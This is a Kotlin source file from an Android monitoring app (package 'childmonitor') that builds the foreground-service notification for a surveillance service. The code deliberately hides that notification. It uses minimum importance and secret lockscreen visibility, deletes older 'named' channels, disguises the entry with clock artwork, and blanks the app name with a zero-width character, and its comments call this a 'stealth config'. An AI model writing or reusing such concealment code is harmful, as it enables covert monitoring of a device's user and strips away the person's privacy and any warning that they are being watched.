package com.childmonitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.graphics.BitmapFactory
import android.os.Build
import android.widget.RemoteViews
import androidx.core.app.NotificationCompat
import androidx.core.graphics.drawable.IconCompat

/**
 * Minimal foreground notification required by Android for FGS.
 *
 * Completely hiding it is not allowed on modern Android (the OS kills the service).
 * Quiet FGS chrome: one analog-clock small icon (no large icon — MIUI puts that on the right).
 */
object SilentNotificationHelper {

    /**
     * Versioned channel id — Xiaomi caches channel settings; bump when stealth config changes
     * so IMPORTANCE_MIN applies on devices that already had the old channel.
     */
    const val CHANNEL_ID = "monitoring_silent_v7"
    const val NOTIFICATION_ID = 1011

    fun ensureChannel(context: Context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = context.getSystemService(NotificationManager::class.java) ?: return
        // Drop obsolete channels that showed the old loud / named notification.
        listOf(
            com.childmonitor.constants.NotificationConstants.CHANNEL_MONITORING_SILENT,
            "monitoring_silent_v2",
            "monitoring_silent_v3",
            "monitoring_silent_v4",
            "monitoring_silent_v5",
            "monitoring_silent_v6",
        ).forEach { oldId ->
            try {
                nm.deleteNotificationChannel(oldId)
            } catch (_: Exception) {
            }
        }
        val channel = NotificationChannel(
            CHANNEL_ID,
            context.getString(R.string.silent_channel_name),
            NotificationManager.IMPORTANCE_MIN,
        ).apply {
            description = context.getString(R.string.silent_channel_description)
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            setSound(null, null)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                setAllowBubbles(false)
            }
            // Make notification as invisible as possible
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                importance = NotificationManager.IMPORTANCE_MIN
            }
        }
        nm.createNotificationChannel(channel)
    }

    fun buildForegroundNotification(context: Context): Notification {
        ensureChannel(context)
        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle(context.getString(R.string.silent_notification_title))
            .setContentText(context.getString(R.string.silent_notification_text))
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setSilent(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
            .setAutoCancel(false)
            .setDefaults(0)
            .setGroup("silent_monitoring")
            .setBadgeIconType(NotificationCompat.BADGE_ICON_NONE)
        applyAppClockIcon(builder, context)
        return builder.build()
    }

    /**
     * Use the same full-color Clock launcher art in the shade.
     * MIUI otherwise treats smallIcon as a grayscale glyph (hands only, no 12/6).
     */
    fun applyAppClockIcon(builder: NotificationCompat.Builder, context: Context) {
        builder.setSmallIcon(R.drawable.ic_notification_app_icon)
        val bmp = BitmapFactory.decodeResource(context.resources, R.drawable.ic_notification_app_icon)
        if (bmp != null) {
            builder.setSmallIcon(IconCompat.createWithBitmap(bmp))
        }
        val logo = RemoteViews(context.packageName, R.layout.notification_clock_logo)
        builder.setCustomContentView(logo)
        builder.setCustomHeadsUpContentView(logo)
        builder.extras.putBoolean("miui.isGrayscaleIcon", false)
        builder.extras.putString("android.substName", "\u200b")
    }

    fun notificationId(): Int = NOTIFICATION_ID
}
